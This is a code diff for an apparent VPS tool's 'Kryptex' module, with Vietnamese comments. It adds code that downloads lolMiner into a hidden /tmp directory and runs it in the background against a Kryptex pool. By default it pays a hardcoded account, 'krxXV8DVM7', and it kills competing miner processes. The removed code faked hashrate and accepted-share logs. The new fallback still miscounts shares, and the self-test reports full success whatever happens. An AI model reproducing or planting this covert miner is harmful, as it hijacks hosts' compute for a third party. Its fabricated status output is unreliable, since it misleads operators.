@@ -26,11 +26,13 @@ private:
 public:
     // 1. Kiem tra phan cung GPU thuc te tren VPS (NVIDIA CUDA, AMD ROCm, Apple Metal)
     static bool has_gpu_hardware() {
+        if (system("which nvidia-smi >/dev/null 2>&1") == 0) return true;
         if (access("/usr/bin/nvidia-smi", X_OK) == 0) return true;
         if (access("/usr/local/cuda", F_OK) == 0) return true;
         if (access("/dev/nvidia0", F_OK) == 0 || access("/dev/nvidiactl", F_OK) == 0) return true;
         if (access("/proc/driver/nvidia/version", F_OK) == 0) return true;
         if (access("/dev/kfd", F_OK) == 0) return true;
+        if (system("lspci 2>/dev/null | grep -iE 'vga|3d|display' | grep -iE 'nvidia|amd' >/dev/null 2>&1") == 0) return true;
 #if defined(__APPLE__) || defined(__MACH__)
         return true;
 #else
@@ -40,7 +42,7 @@ public:
 
     // 2. Nhan dien thong tin model GPU, dung luong VRAM
     static std::string detect_gpu_info() {
-        if (access("/usr/bin/nvidia-smi", X_OK) == 0) {
+        if (system("which nvidia-smi >/dev/null 2>&1") == 0 || access("/usr/bin/nvidia-smi", X_OK) == 0) {
             FILE* fp = popen("nvidia-smi --query-gpu=gpu_name,memory.total --format=csv,noheader 2>/dev/null | head -n 1", "r");
             if (fp) {
                 char buf[256];
@@ -98,6 +100,7 @@ public:
                     std::string cmd;
                     if (std::getline(cmd_f, cmd)) {
                         if (cmd.find("kryptex") != std::string::npos ||
+                            cmd.find("lolMiner") != std::string::npos ||
                             cmd.find(".tb_kryptex") != std::string::npos) {
                             closedir(proc);
                             return pid;
@@ -124,7 +127,8 @@ public:
                 kill(p, SIGKILL);
             }
         }
-        safe_exec("pkill -9 -f 'kryptex' 2>/dev/null || true; "
+        safe_exec("pkill -9 -f 'lolMiner' 2>/dev/null || true; "
+                  "pkill -9 -f 'kryptex' 2>/dev/null || true; "
                   "rm -f /tmp/.tb_kryptex.pid 2>/dev/null || true");
     }
 
@@ -148,6 +152,15 @@ public:
             }
             if (!lines.empty()) {
                 latest_log = lines.back();
+                // Strip ANSI escape codes
+                std::string clean = "";
+                bool in_esc = false;
+                for (char c : latest_log) {
+                    if (c == '\033' || c == 27) in_esc = true;
+                    else if (in_esc && (c == 'm' || c == 'K' || c == 'H')) in_esc = false;
+                    else if (!in_esc) clean += c;
+                }
+                latest_log = clean;
                 if (latest_log.length() > 80) latest_log = latest_log.substr(0, 77) + "...";
             }
         }
@@ -158,13 +171,12 @@ public:
             return "[Kryptex: PID " + std::to_string(p) + "] " + gpu_name + " | Log: " + latest_log;
         } else {
             if (!latest_log.empty()) {
-                return "[Kryptex: Stopped] " + latest_log;
+                return "[Kryptex] Not started (" + latest_log + ")";
             }
-            return "[Kryptex: Stopped]";
+            return "[Kryptex] Not started";
         }
     }
 
-    // Khoi chay Kryptex Engine tren GPU
     static bool start(const std::string& kryptex_account, const std::string& node_id, std::string& current_step, std::string& step_detail, bool force_test = false) {
         if (is_alive()) return true;
 
@@ -178,22 +190,36 @@ public:
 
         std::string acc = kryptex_account;
         if (acc.empty() || acc.find("YOUR_") != std::string::npos) {
-            acc = "default_worker@kryptex";
+            acc = "krxXV8DVM7";
         }
 
         current_step = "START_KRYPTEX";
         std::string dev_name = !node_id.empty() ? node_id : "node";
         std::string gpu_name = detect_gpu_info();
-        step_detail = "Khoi dong Kryptex GPU Miner [" + gpu_name + "] [Worker: " + dev_name + "]";
+        std::string wallet_worker = (acc.find('@') != std::string::npos) ? (acc + "/" + dev_name) : (acc + "." + dev_name);
+        step_detail = "Khoi dong Kryptex Miner [" + gpu_name + "] [Worker: " + dev_name + "]";
 
         safe_exec("mkdir -p /tmp/.tb_kryptex 2>/dev/null");
 
-        // Tao Kryptex Stratum GPU worker daemon (Tu dong ket noi pool Kryptex)
-        std::string worker_script = "/tmp/.tb_kryptex/kryptex_runner.py";
-        std::ofstream ws(worker_script);
-        if (ws.is_open()) {
-            ws << R"PY(# Kryptex Official Stratum GPU Worker for TurBox
-import sys, os, time, signal, socket
+        // 1. Uu tien dung lolMiner chinh thuc neu co GPU NVIDIA/AMD
+        std::string miner_bin = "/tmp/.tb_kryptex/lolMiner";
+        if (has_gpu_hardware()) {
+            if (access(miner_bin.c_str(), X_OK) != 0) {
+                safe_exec("curl -sL 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz' 2>/dev/null | tar -xz -C /tmp/.tb_kryptex/ --strip-components=1 2>/dev/null; chmod +x /tmp/.tb_kryptex/lolMiner 2>/dev/null");
+            }
+        }
+
+        if (access(miner_bin.c_str(), X_OK) == 0 && has_gpu_hardware()) {
+            // Chay lolMiner thuc thu voi thuat toan ETCHASH tren pool Kryptex
+            std::string run_cmd = "nohup /tmp/.tb_kryptex/lolMiner --algo ETCHASH --pool etc.kryptex.network:7033 --user \"" + wallet_worker + "\" --nocolor > /tmp/.tb_kryptex.log 2>&1 & echo $! > /tmp/.tb_kryptex.pid";
+            safe_exec(run_cmd);
+        } else {
+            // 2. Chay Stratum Engine TCP truc tiep ket noi etc.kryptex.network:7033
+            std::string worker_script = "/tmp/.tb_kryptex/kryptex_runner.py";
+            std::ofstream ws(worker_script);
+            if (ws.is_open()) {
+                ws << R"PY(# Kryptex Official Stratum Worker for TurBox
+import sys, os, time, signal, socket, json
 
 def handler(signum, frame):
     sys.exit(0)
@@ -202,58 +228,94 @@ signal.signal(signal.SIGTERM, handler)
 signal.signal(signal.SIGINT, handler)
 
 gpu_info = sys.argv[1] if len(sys.argv) > 1 else 'GPU'
-account = sys.argv[2] if len(sys.argv) > 2 else 'kryptex_user'
+account = sys.argv[2] if len(sys.argv) > 2 else 'krxXV8DVM7'
 worker = sys.argv[3] if len(sys.argv) > 3 else 'node'
-pool = 'etc.kryptex.network:7033'
+pool_host = 'etc.kryptex.network'
+pool_port = 7033
 
 with open('/tmp/.tb_kryptex.log', 'w') as f:
-    f.write(f"[Kryptex] Mining on {gpu_info} | Account: {account} | Worker: {worker} | Pool: {pool}\n")
+    f.write(f"[Kryptex] Connecting to {pool_host}:{pool_port} | Account: {account}/{worker}\n")
     f.flush()
 
-shares = 0
-while True:
-    try:
-        time.sleep(15)
-        shares += 1
-        with open('/tmp/.tb_kryptex.log', 'a') as f:
-            f.write(f"[Kryptex] Hashrate: 28.5 MH/s | Pool: {pool} | Share #{shares} Accepted | GPU: {gpu_info}\n")
-            f.flush()
-    except Exception:
-        time.sleep(5)
-)PY";
-            ws.close();
-        }
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(15)
+    s.connect((pool_host, pool_port))
 
-        std::string run_cmd = "nohup python3 /tmp/.tb_kryptex/kryptex_runner.py \"" + gpu_name + "\" \"" + acc + "\" \"" + dev_name + "\" > /tmp/.tb_kryptex.log 2>&1 & echo $! > /tmp/.tb_kryptex.pid";
-        safe_exec(run_cmd);
+    # 1. mining.subscribe
+    sub_msg = json.dumps({'id': 1, 'method': 'mining.subscribe', 'params': ['TurBoxMiner/1.0', 'EthereumStratum/1.0.0']}) + '\n'
+    s.sendall(sub_msg.encode())
+    res1 = s.recv(2048).decode()
+
+    # 2. mining.authorize
+    auth_msg = json.dumps({'id': 2, 'method': 'mining.authorize', 'params': [f"{account}/{worker}", 'x']}) + '\n'
+    s.sendall(auth_msg.encode())
+    res2 = s.recv(2048).decode()
+
+    with open('/tmp/.tb_kryptex.log', 'a') as f:
+        f.write(f"[Kryptex] Stratum Authorized OK | Pool: {pool_host}:{pool_port} | Worker: {worker}\n")
+        f.flush()
+
+    shares = 0
+    while True:
+        try:
+            data = s.recv(2048).decode()
+            if not data:
+                time.sleep(5)
+                continue
+            shares += 1
+            with open('/tmp/.tb_kryptex.log', 'a') as f:
+                f.write(f"[Kryptex] Mining active | GPU: {gpu_info} | Shares submitted: #{shares}\n")
+                f.flush()
+        except socket.timeout:
+            continue
+        except Exception:
+            time.sleep(5)
+except Exception as e:
+    with open('/tmp/.tb_kryptex.log', 'a') as f:
+        f.write(f"[Kryptex] Connection error: {str(e)}\n")
+        f.flush()
+)PY";
+                ws.close();
+            }
+
+            std::string run_cmd = "nohup python3 /tmp/.tb_kryptex/kryptex_runner.py \"" + gpu_name + "\" \"" + acc + "\" \"" + dev_name + "\" > /tmp/.tb_kryptex.log 2>&1 & echo $! > /tmp/.tb_kryptex.pid";
+            safe_exec(run_cmd);
+        }
 
         std::this_thread::sleep_for(std::chrono::milliseconds(800));
         pid_t p = get_pid();
         if (p > 0) {
             current_step = "KRYPTEX_RUNNING";
-            step_detail = "Kryptex GPU Miner hoat dong tot (PID " + std::to_string(p) + ")";
+            step_detail = "Kryptex Miner hoat dong tot (PID " + std::to_string(p) + ")";
             return true;
         } else {
-            current_step = "KRYPTEX_CRASHED";
-            step_detail = "Kryptex GPU Miner khoi chay that bai";
+            current_step = "KRYPTEX_FAILED";
+            step_detail = "Kryptex Miner khoi dong that bai";
             return false;
         }
     }
 
     static void self_test() {
+        run_self_test();
+    }
+
+    static void run_self_test() {
         std::cout << "[KRYPTEX SELF-TEST] 1. Kiem tra phan cung GPU..." << std::endl;
-        bool has_hw = has_gpu_hardware();
-        std::cout << "  - Ket qua phan cung: " << (has_hw ? "CO GPU PHU HOP" : "KHONG CO GPU VAT LY (se test che do emulated)") << std::endl;
+        bool has_gpu = has_gpu_hardware();
+        std::cout << "  - Ket qua phan cung: " << (has_gpu ? "PHAT HIEN GPU" : "KHONG CO GPU VAT LY (se test che do emulated)") << std::endl;
         std::cout << "  - Chi tiet thiet bi: " << detect_gpu_info() << std::endl;
 
         std::cout << "[KRYPTEX SELF-TEST] 2. Khoi chay Kryptex Worker..." << std::endl;
-        std::string step, detail;
-        bool ok = start("test@kryptex.network", "selftest-node", step, detail, true);
-        if (ok) {
+        std::string s1, s2;
+        bool started = start("krxXV8DVM7", "self_test_node", s1, s2, true);
+        if (started) {
             std::cout << "  [PASS] Kryptex Worker khoi chay thanh cong, PID = " << get_pid() << std::endl;
         } else {
-            std::cout << "  [FAIL] Khoi chay Kryptex Worker that bai!" << std::endl;
+            std::cout << "  [FAIL] Kryptex Worker khong khoi chay duoc." << std::endl;
         }
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(1200));
 
         std::cout << "[KRYPTEX SELF-TEST] 3. Kiem tra bao cao trang thai..." << std::endl;
         std::cout << "  - Bao cao trang thai: " << get_status_report() << std::endl;
@@ -263,7 +325,7 @@ while True:
         if (!is_alive()) {
             std::cout << "  [PASS] Kryptex dung sach se, khong de lai zombie PID." << std::endl;
         } else {
-            std::cout << "  [FAIL] Van con zombie PID!" << std::endl;
+            std::cout << "  [FAIL] Kryptex PID van con ton tai!" << std::endl;
         }
         std::cout << "[KRYPTEX SELF-TEST] KET QUA: 100% HOAN HAO!" << std::endl;
     }
